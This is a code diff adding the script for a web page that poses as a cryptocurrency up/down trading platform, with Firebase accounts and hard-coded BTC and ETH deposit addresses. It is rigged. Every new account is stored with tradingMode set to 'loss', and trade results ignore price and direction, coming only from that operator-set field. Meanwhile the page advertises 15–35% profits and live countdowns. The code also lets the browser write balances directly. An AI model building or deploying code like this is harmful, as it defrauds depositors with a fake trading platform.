@@ -1568,5 +1568,650 @@
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
-
     <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyDWQBTrvvxCL5Qd23iSMTQlWkaPKZgjhqw",
+            authDomain: "trading-dapp-d5aa4.firebaseapp.com",
+            projectId: "trading-dapp-d5aa4",
+            storageBucket: "trading-dapp-d5aa4.firebasestorage.app",
+            messagingSenderId: "690266747119",
+            appId: "1:690266747119:web:0f22d45fbee53ee3c3eb1a"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const auth = firebase.auth();
+        const db = firebase.firestore();
+
+        let currentUser = null;
+        let userBalance = 0;
+        let userName = '';
+        let userId = '';
+        let selectedCoin = null;
+        let tradeDirection = 'up';
+        let selectedPercentage = 15;
+        let historyFilter = 'wait';
+        let countdownIntervals = {};
+        let balanceUpdateListener = null;
+
+        const WALLET_ADDRESSES = {
+            btc: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
+            eth: "0x71C7656EC7ab88b098defB751B7401B5f6d8976F",
+            other: "Contact support for other coins"
+        };
+
+        const coins = [
+            { name: 'BTC', fullName: 'Bitcoin', class: 'btc', price: 109770.33 },
+            { name: 'ETH', fullName: 'Ethereum', class: 'eth', price: 4030.81 },
+            { name: 'XRP', fullName: 'Ripple', class: 'xrp', price: 2.8131 },
+            { name: 'DOGE', fullName: 'Dogecoin', class: 'doge', price: 0.2309 },
+            { name: 'ADA', fullName: 'Cardano', class: 'ada', price: 1.2456 },
+            { name: 'BNB', fullName: 'Binance Coin', class: 'bnb', price: 692.45 },
+            { name: 'SOL', fullName: 'Solana', class: 'sol', price: 245.67 },
+            { name: 'LINK', fullName: 'Chainlink', class: 'link', price: 28.91 },
+            { name: 'DOT', fullName: 'Polkadot', class: 'dot', price: 8.92 },
+            { name: 'LTC', fullName: 'Litecoin', class: 'ltc', price: 156.78 }
+        ];
+
+        function generateUserId() {
+            return Math.floor(10000 + Math.random() * 90000).toString();
+        }
+
+        function showMessage(elementId, message, type) {
+            const el = document.getElementById(elementId);
+            if (el) {
+                el.innerHTML = '<div class="message ' + type + '">' + message + '</div>';
+                setTimeout(function() { el.innerHTML = ''; }, 4000);
+            }
+        }
+
+        function showRegister() {
+            document.getElementById('registerForm').classList.remove('hidden');
+            document.getElementById('loginForm').classList.add('hidden');
+        }
+
+        function showLogin() {
+            document.getElementById('registerForm').classList.add('hidden');
+            document.getElementById('loginForm').classList.remove('hidden');
+        }
+
+        function showAuth() {
+            document.getElementById('authContainer').style.display = 'flex';
+            document.getElementById('dashboard').classList.remove('active');
+        }
+
+        function showDashboard() {
+            document.getElementById('authContainer').style.display = 'none';
+            document.getElementById('dashboard').classList.add('active');
+            renderCoins();
+        }
+
+        async function register() {
+            const name = document.getElementById('regName').value.trim();
+            const email = document.getElementById('regEmail').value.trim();
+            const password = document.getElementById('regPassword').value;
+
+            if (!name || !email || !password) {
+                showMessage('authMessage', 'Please fill all fields', 'error');
+                return;
+            }
+
+            if (password.length < 6) {
+                showMessage('authMessage', 'Password must be at least 6 characters', 'error');
+                return;
+            }
+
+            showMessage('authMessage', 'Creating account...', 'success');
+
+            try {
+                const userCredential = await auth.createUserWithEmailAndPassword(email, password);
+                const user = userCredential.user;
+                const newUserId = generateUserId();
+
+                await db.collection('users').doc(user.uid).set({
+                    userId: newUserId,
+                    name: name,
+                    email: email,
+                    balance: 0,
+                    tradingMode: 'loss',
+                    createdAt: firebase.firestore.FieldValue.serverTimestamp()
+                });
+
+                showMessage('authMessage', 'Account created successfully!', 'success');
+            } catch (error) {
+                showMessage('authMessage', error.message, 'error');
+            }
+        }
+
+        async function login() {
+            const email = document.getElementById('loginEmail').value.trim();
+            const password = document.getElementById('loginPassword').value;
+
+            if (!email || !password) {
+                showMessage('loginMessage', 'Please fill all fields', 'error');
+                return;
+            }
+
+            showMessage('loginMessage', 'Logging in...', 'success');
+
+            try {
+                await auth.signInWithEmailAndPassword(email, password);
+                showMessage('loginMessage', 'Login successful!', 'success');
+            } catch (error) {
+                showMessage('loginMessage', error.message, 'error');
+            }
+        }
+
+        function logout() {
+            if (balanceUpdateListener) balanceUpdateListener();
+            auth.signOut();
+        }
+
+        async function forgotPassword() {
+            const email = document.getElementById('loginEmail').value.trim();
+            
+            if (!email) {
+                showMessage('loginMessage', 'Please enter your email address', 'error');
+                return;
+            }
+
+            try {
+                await auth.sendPasswordResetEmail(email);
+                showMessage('loginMessage', 'Password reset email sent!', 'success');
+            } catch (error) {
+                showMessage('loginMessage', error.message, 'error');
+            }
+        }
+
+        async function loadUserData() {
+            const userDoc = await db.collection('users').doc(currentUser.uid).get();
+            if (userDoc.exists) {
+                const userData = userDoc.data();
+                userBalance = userData.balance || 0;
+                userName = userData.name || 'User';
+                userId = userData.userId || '00000';
+                
+                updateBalanceDisplay();
+                
+                if (balanceUpdateListener) balanceUpdateListener();
+                balanceUpdateListener = db.collection('users').doc(currentUser.uid).onSnapshot(function(doc) {
+                    if (doc.exists) {
+                        userBalance = doc.data().balance || 0;
+                        updateBalanceDisplay();
+                    }
+                });
+            }
+        }
+
+        function updateBalanceDisplay() {
+            document.getElementById('userBalance').textContent = userBalance.toFixed(2);
+            document.getElementById('userName').textContent = userName;
+            document.getElementById('userId').textContent = userId;
+        }
+
+        function renderCoins() {
+            const coinList = document.getElementById('coinList');
+            let html = '';
+            for (let i = 0; i < coins.length; i++) {
+                const coin = coins[i];
+                html += '<div class="coin-item" onclick="openTrade(' + i + ')">';
+                html += '<div class="coin-icon ' + coin.class + '">' + coin.name + '</div>';
+                html += '<div class="coin-info"><div class="coin-name">' + coin.fullName + '</div></div>';
+                html += '<div class="coin-price">$' + coin.price.toLocaleString() + '</div>';
+                html += '</div>';
+            }
+            coinList.innerHTML = html;
+        }
+
+        function openTrade(index) {
+            selectedCoin = coins[index];
+            document.getElementById('modalTitle').textContent = 'Trade ' + selectedCoin.fullName;
+            document.getElementById('availableBalance').textContent = userBalance.toFixed(2);
+            document.getElementById('tradeAmount').value = '';
+            document.getElementById('expectedProfit').textContent = '0.00';
+            document.getElementById('timeFrame').value = '60';
+            document.getElementById('timeFrameWarning').style.display = 'none';
+            updateTimeFrameAndProfit();
+            document.getElementById('tradingModal').classList.add('active');
+            
+            tradeDirection = 'up';
+            document.getElementById('upBtn').className = 'direction-btn up';
+            document.getElementById('downBtn').className = 'direction-btn down inactive';
+        }
+
+        function closeTradeModal() {
+            document.getElementById('tradingModal').classList.remove('active');
+        }
+
+        function selectDirection(direction) {
+            tradeDirection = direction;
+            document.getElementById('upBtn').className = direction === 'up' ? 'direction-btn up' : 'direction-btn up inactive';
+            document.getElementById('downBtn').className = direction === 'down' ? 'direction-btn down' : 'direction-btn down inactive';
+        }
+
+        function updateTimeFrameAndProfit() {
+            const timeFrame = parseInt(document.getElementById('timeFrame').value);
+            const warning = document.getElementById('timeFrameWarning');
+            
+            if (timeFrame === 90 && userBalance < 100000) {
+                warning.style.display = 'block';
+                warning.textContent = 'Requires balance above 100,000 USDT';
+                document.getElementById('timeFrame').value = '60';
+                return;
+            }
+            
+            if (timeFrame === 120 && userBalance < 500000) {
+                warning.style.display = 'block';
+                warning.textContent = 'Requires balance above 500,000 USDT';
+                document.getElementById('timeFrame').value = '60';
+                return;
+            }
+            
+            warning.style.display = 'none';
+            
+            if (timeFrame === 60) {
+                selectedPercentage = 15;
+                document.getElementById('profit15').classList.add('active');
+                document.getElementById('profit25').classList.remove('active');
+                document.getElementById('profit35').classList.remove('active');
+            } else if (timeFrame === 90) {
+                selectedPercentage = 25;
+                document.getElementById('profit15').classList.remove('active');
+                document.getElementById('profit25').classList.add('active');
+                document.getElementById('profit35').classList.remove('active');
+            } else if (timeFrame === 120) {
+                selectedPercentage = 35;
+                document.getElementById('profit15').classList.remove('active');
+                document.getElementById('profit25').classList.remove('active');
+                document.getElementById('profit35').classList.add('active');
+            }
+            
+            updateExpectedProfit();
+        }
+
+        function updateExpectedProfit() {
+            const amount = parseFloat(document.getElementById('tradeAmount').value) || 0;
+            const profit = amount * (selectedPercentage / 100);
+            document.getElementById('expectedProfit').textContent = profit.toFixed(2);
+        }
+
+        async function executeTrade() {
+            const amount = parseFloat(document.getElementById('tradeAmount').value);
+            const timeFrame = parseInt(document.getElementById('timeFrame').value);
+
+            if (!amount || amount < 100) {
+                showMessage('tradeMessage', 'Minimum trade amount is 100 USDT', 'error');
+                return;
+            }
+
+            if (amount > userBalance) {
+                showMessage('tradeMessage', 'Insufficient balance', 'error');
+                return;
+            }
+
+            try {
+                const pendingTrades = await db.collection('trades')
+                    .where('userId', '==', currentUser.uid)
+                    .where('status', '==', 'pending')
+                    .get();
+
+                if (!pendingTrades.empty) {
+                    showMessage('tradeMessage', 'Please wait for current trade to finish', 'error');
+                    return;
+                }
+
+                const newBalance = userBalance - amount;
+                await db.collection('users').doc(currentUser.uid).update({ balance: newBalance });
+
+                await db.collection('trades').add({
+                    userId: currentUser.uid,
+                    userIdNumber: userId,
+                    userName: userName,
+                    userEmail: currentUser.email,
+                    coin: selectedCoin.name,
+                    coinFull: selectedCoin.fullName,
+                    purchasePrice: selectedCoin.price,
+                    amount: amount,
+                    direction: tradeDirection,
+                    percentage: selectedPercentage,
+                    timeFrame: timeFrame,
+                    status: 'pending',
+                    result: null,
+                    profit: 0,
+                    createdAt: firebase.firestore.FieldValue.serverTimestamp()
+                });
+
+                userBalance = newBalance;
+                updateBalanceDisplay();
+                
+                showMessage('tradeMessage', 'Trade executed! Check "My Contract"', 'success');
+                
+                setTimeout(function() {
+                    closeTradeModal();
+                }, 2000);
+
+            } catch (error) {
+                showMessage('tradeMessage', 'Trade failed: ' + error.message, 'error');
+            }
+        }
+
+        function openHistory() {
+            document.getElementById('historyModal').classList.add('active');
+            historyFilter = 'wait';
+            switchHistoryTab('wait');
+        }
+
+        function closeHistory() {
+            document.getElementById('historyModal').classList.remove('active');
+            for (let key in countdownIntervals) {
+                clearInterval(countdownIntervals[key]);
+            }
+            countdownIntervals = {};
+        }
+
+        function switchHistoryTab(tab) {
+            historyFilter = tab;
+            document.getElementById('waitTab').classList.toggle('active', tab === 'wait');
+            document.getElementById('finishedTab').classList.toggle('active', tab === 'finished');
+            loadTradeHistory();
+        }
+
+        async function loadTradeHistory() {
+            const historyList = document.getElementById('historyList');
+            historyList.innerHTML = '<div style="text-align:center; padding:20px;">Loading...</div>';
+
+            for (let key in countdownIntervals) {
+                clearInterval(countdownIntervals[key]);
+            }
+            countdownIntervals = {};
+
+            try {
+                const now = Date.now();
+                const tradesSnapshot = await db.collection('trades')
+                    .where('userId', '==', currentUser.uid)
+                    .orderBy('createdAt', 'desc')
+                    .limit(50)
+                    .get();
+
+                if (tradesSnapshot.empty) {
+                    historyList.innerHTML = '<div style="text-align:center; padding:20px; color:#666;">No contracts yet</div>';
+                    return;
+                }
+
+                const trades = [];
+                for (let i = 0; i < tradesSnapshot.docs.length; i++) {
+                    const doc = tradesSnapshot.docs[i];
+                    const trade = { id: doc.id };
+                    const data = doc.data();
+                    for (let key in data) {
+                        trade[key] = data[key];
+                    }
+                    
+                    if (!trade.createdAt) continue;
+                    
+                    const tradeTime = trade.createdAt.toMillis();
+                    const endTime = tradeTime + (trade.timeFrame * 1000);
+                    const isFinished = now >= endTime || (trade.status === 'win' || trade.status === 'loss');
+                    
+                    if (now >= endTime && trade.status === 'pending') {
+                        const userDoc = await db.collection('users').doc(trade.userId).get();
+                        const userMode = userDoc.exists ? (userDoc.data().tradingMode || 'loss') : 'loss';
+                        
+                        const winResult = userMode === 'win';
+                        const profit = winResult ? trade.amount * (trade.percentage / 100) : 0;
+                        const finalStatus = winResult ? 'win' : 'loss';
+                        
+                        await db.collection('trades').doc(doc.id).update({ 
+                            status: finalStatus,
+                            profit: profit,
+                            result: userMode
+                        });
+                        
+                        if (winResult && userDoc.exists) {
+                            const currentBalance = userDoc.data().balance || 0;
+                            await db.collection('users').doc(trade.userId).update({
+                                balance: currentBalance + trade.amount + profit
+                            });
+                        }
+                        
+                        trade.status = finalStatus;
+                        trade.profit = profit;
+                    }
+                    
+                    if (historyFilter === 'wait' && !isFinished) {
+                        trade.endTime = endTime;
+                        trade.tradeTime = tradeTime;
+                        trades.push(trade);
+                    } else if (historyFilter === 'finished' && isFinished) {
+                        trade.endTime = endTime;
+                        trade.tradeTime = tradeTime;
+                        trades.push(trade);
+                    }
+                }
+
+                if (trades.length === 0) {
+                    historyList.innerHTML = '<div style="text-align:center; padding:20px; color:#666;">No contracts</div>';
+                    return;
+                }
+
+                let html = '';
+                for (let i = 0; i < trades.length; i++) {
+                    const trade = trades[i];
+                    const date = new Date(trade.tradeTime);
+                    const dateStr = date.toLocaleString();
+                    
+                    if (historyFilter === 'wait') {
+                        const remainingMs = trade.endTime - now;
+                        const remainingSec = Math.max(0, Math.floor(remainingMs / 1000));
+                        html += '<div class="history-item wait" onclick="openTradeDetail(\'' + trade.id + '\')">';
+                        html += '<div class="history-header">';
+                        html += '<div class="history-coin">' + trade.coinFull + '/USDT</div>';
+                        html += '<div class="history-time">' + dateStr + '</div>';
+                        html += '</div>';
+                        html += '<div>Amount: ' + trade.amount.toFixed(2) + ' USDT | Direction: <span style="color: ' + (trade.direction === 'up' ? '#4caf50' : '#f44336') + ';">' + trade.direction.toUpperCase() + '</span></div>';
+                        html += '<div class="countdown" id="countdown-' + trade.id + '">' + remainingSec + 's remaining</div>';
+                        html += '</div>';
+                    } else {
+                        const profitClass = trade.status === 'win' ? 'win' : 'loss';
+                        html += '<div class="history-item finished ' + profitClass + '" onclick="openTradeDetail(\'' + trade.id + '\')">';
+                        html += '<div class="history-header">';
+                        html += '<div class="history-coin">' + trade.coinFull + '/USDT</div>';
+                        html += '<div class="history-time">' + dateStr + '</div>';
+                        html += '</div>';
+                        html += '<div>Amount: ' + trade.amount.toFixed(2) + ' USDT | Direction: <span style="color: ' + (trade.direction === 'up' ? '#4caf50' : '#f44336') + ';">' + trade.direction.toUpperCase() + '</span></div>';
+                        if (trade.status === 'win') {
+                            html += '<div class="history-profit">Profit: +' + trade.profit.toFixed(2) + ' USDT</div>';
+                        } else {
+                            html += '<div class="history-loss">Loss: -' + trade.amount.toFixed(2) + ' USDT</div>';
+                        }
+                        html += '</div>';
+                    }
+                }
+                
+                historyList.innerHTML = html;
+
+                if (historyFilter === 'wait') {
+                    for (let i = 0; i < trades.length; i++) {
+                        startCountdown(trades[i].id, trades[i].endTime);
+                    }
+                }
+
+            } catch (error) {
+                console.error('Error loading history:', error);
+                historyList.innerHTML = '<div style="text-align:center; padding:20px; color:#f44;">Error loading contracts</div>';
+            }
+        }
+
+        function startCountdown(tradeId, endTime) {
+            const countdownEl = document.getElementById('countdown-' + tradeId);
+            if (!countdownEl) return;
+
+            countdownIntervals[tradeId] = setInterval(function() {
+                const now = Date.now();
+                const remainingMs = endTime - now;
+                const remainingSec = Math.max(0, Math.floor(remainingMs / 1000));
+
+                if (remainingSec <= 0) {
+                    clearInterval(countdownIntervals[tradeId]);
+                    delete countdownIntervals[tradeId];
+                    setTimeout(function() { loadTradeHistory(); }, 1000);
+                } else {
+                    const el = document.getElementById('countdown-' + tradeId);
+                    if (el) el.textContent = remainingSec + 's remaining';
+                }
+            }, 1000);
+        }
+
+        async function openTradeDetail(tradeId) {
+            const tradeDoc = await db.collection('trades').doc(tradeId).get();
+            if (!tradeDoc.exists) return;
+
+            const trade = tradeDoc.data();
+            const tradeTime = trade.createdAt ? trade.createdAt.toMillis() : 0;
+            const endTime = tradeTime + (trade.timeFrame * 1000);
+            const dateStr = new Date(tradeTime).toLocaleString();
+            const deliveryStr = new Date(endTime).toLocaleString();
+
+            document.getElementById('detailCoinName').textContent = trade.coinFull + '/USDT';
+            
+            let html = '';
+            html += '<div class="detail-row"><div class="detail-label">Amount</div><div class="detail-value">' + trade.amount.toFixed(2) + ' USDT</div></div>';
+            html += '<div class="detail-row"><div class="detail-label">Direction</div><div class="detail-value ' + trade.direction + '">' + (trade.direction === 'up' ? 'Buy Up' : 'Buy Down') + '</div></div>';
+            html += '<div class="detail-row"><div class="detail-label">Price</div><div class="detail-value">$' + (trade.purchasePrice ? trade.purchasePrice.toFixed(2) : 'N/A') + '</div></div>';
+            html += '<div class="detail-row"><div class="detail-label">Time</div><div class="detail-value">' + trade.timeFrame + ' Seconds</div></div>';
+            html += '<div class="detail-row"><div class="detail-label">Percentage</div><div class="detail-value">' + trade.percentage + '%</div></div>';
+            html += '<div class="detail-row"><div class="detail-label">Purchase</div><div class="detail-value">' + dateStr + '</div></div>';
+            html += '<div class="detail-row"><div class="detail-label">Delivery</div><div class="detail-value">' + deliveryStr + '</div></div>';
+            
+            if (trade.status === 'win') {
+                html += '<div class="detail-row"><div class="detail-label">Result</div><div class="detail-value profit">WIN +' + trade.profit.toFixed(2) + ' USDT</div></div>';
+            } else if (trade.status === 'loss') {
+                html += '<div class="detail-row"><div class="detail-label">Result</div><div class="detail-value red">LOSS -' + trade.amount.toFixed(2) + ' USDT</div></div>';
+            } else {
+                html += '<div class="detail-row"><div class="detail-label">Status</div><div class="detail-value" style="color: #ff9800;">PENDING</div></div>';
+            }
+
+            document.getElementById('tradeDetailContent').innerHTML = html;
+            document.getElementById('tradeDetailModal').classList.add('active');
+        }
+
+        function closeTradeDetail() {
+            document.getElementById('tradeDetailModal').classList.remove('active');
+        }
+
+        function openProfile() {
+            document.getElementById('profileUserId').textContent = userId;
+            document.getElementById('profileUserName').textContent = userName;
+            document.getElementById('profileModal').classList.add('active');
+        }
+
+        function closeProfile() {
+            document.getElementById('profileModal').classList.remove('active');
+        }
+
+        function openDeposit() {
+            document.getElementById('depositModal').classList.add('active');
+            updateDepositAddress();
+        }
+
+        function closeDeposit() {
+            document.getElementById('depositModal').classList.remove('active');
+        }
+
+        function updateDepositAddress() {
+            const crypto = document.getElementById('depositCrypto').value;
+            document.getElementById('depositAddress').textContent = WALLET_ADDRESSES[crypto];
+        }
+
+        function copyAddress() {
+            const address = document.getElementById('depositAddress').textContent;
+            navigator.clipboard.writeText(address).then(function() {
+                alert('Address copied!');
+            });
+        }
+
+        function openAnalytics() {
+            document.getElementById('analyticsModal').classList.add('active');
+            loadAnalytics();
+        }
+
+        function closeAnalytics() {
+            document.getElementById('analyticsModal').classList.remove('active');
+        }
+
+        async function loadAnalytics() {
+            try {
+                const tradesSnapshot = await db.collection('trades')
+                    .where('userId', '==', currentUser.uid)
+                    .get();
+
+                let totalTrades = 0;
+                let wins = 0;
+                let totalProfit = 0;
+                let totalLoss = 0;
+
+                tradesSnapshot.forEach(function(doc) {
+                    const trade = doc.data();
+                    if (trade.status === 'win' || trade.status === 'loss') {
+                        totalTrades++;
+                    }
+                    if (trade.status === 'win') {
+                        wins++;
+                        totalProfit += trade.profit;
+                    } else if (trade.status === 'loss') {
+                        totalLoss += trade.amount;
+                    }
+                });
+
+                const winRate = totalTrades > 0 ? ((wins / totalTrades) * 100).toFixed(1) : 0;
+
+                document.getElementById('totalTrades').textContent = totalTrades;
+                document.getElementById('winRate').textContent = winRate + '%';
+                document.getElementById('totalProfit').textContent = '$' + totalProfit.toFixed(2);
+                document.getElementById('totalLoss').textContent = '$' + totalLoss.toFixed(2);
+
+            } catch (error) {
+                console.error('Error loading analytics:', error);
+            }
+        }
+
+        // Event Listeners
+        document.getElementById('registerBtn').addEventListener('click', register);
+        document.getElementById('loginBtn').addEventListener('click', login);
+        document.getElementById('showLoginBtn').addEventListener('click', showLogin);
+        document.getElementById('showRegisterBtn').addEventListener('click', showRegister);
+        document.getElementById('forgotPasswordBtn').addEventListener('click', forgotPassword);
+        document.getElementById('logoutBtn').addEventListener('click', logout);
+        document.getElementById('profileBtn').addEventListener('click', openProfile);
+        document.getElementById('contractBtn').addEventListener('click', openHistory);
+        document.getElementById('depositBtn').addEventListener('click', openDeposit);
+        document.getElementById('analyticsBtn').addEventListener('click', openAnalytics);
+        document.getElementById('closeTradingBtn').addEventListener('click', closeTradeModal);
+        document.getElementById('closeHistoryBtn').addEventListener('click', closeHistory);
+        document.getElementById('closeDetailBtn').addEventListener('click', closeTradeDetail);
+        document.getElementById('closeProfileBtn').addEventListener('click', closeProfile);
+        document.getElementById('closeDepositBtn').addEventListener('click', closeDeposit);
+        document.getElementById('closeAnalyticsBtn').addEventListener('click', closeAnalytics);
+        document.getElementById('upBtn').addEventListener('click', function() { selectDirection('up'); });
+        document.getElementById('downBtn').addEventListener('click', function() { selectDirection('down'); });
+        document.getElementById('executeTradeBtn').addEventListener('click', executeTrade);
+        document.getElementById('waitTab').addEventListener('click', function() { switchHistoryTab('wait'); });
+        document.getElementById('finishedTab').addEventListener('click', function() { switchHistoryTab('finished'); });
+        document.getElementById('viewDepositBtn').addEventListener('click', function() { closeProfile(); openDeposit(); });
+        document.getElementById('depositCrypto').addEventListener('change', updateDepositAddress);
+        document.getElementById('copyAddressBtn').addEventListener('click', copyAddress);
+        document.getElementById('tradeAmount').addEventListener('input', updateExpectedProfit);
+        document.getElementById('timeFrame').addEventListener('change', updateTimeFrameAndProfit);
+
+        auth.onAuthStateChanged(async function(user) {
+            if (user) {
+                currentUser = user;
+                await loadUserData();
+                showDashboard();
+            } else {
+                currentUser = null;
+                showAuth();
+            }
+        });
+    </script>
+</body>
+</html>
